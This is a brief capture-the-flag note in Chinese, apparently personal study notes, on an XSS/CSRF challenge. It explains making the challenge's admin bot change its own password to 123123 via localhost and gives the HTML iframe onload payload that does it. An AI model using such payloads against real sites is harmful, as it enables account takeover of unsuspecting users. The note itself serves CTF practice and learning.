- [[CTF/XSS]]
- [[CTF/CSRF]]
- # 思路
- 让爬虫修改自己的密码为123123即可登陆
- 爬虫没有外网连接，需要让其访问^^127.0.0.1^^
- # Payload
- ```html
  <iframe	onload="window.open('http://127.0.0.1/api/change.php?p=123123')"></iframe>
  ```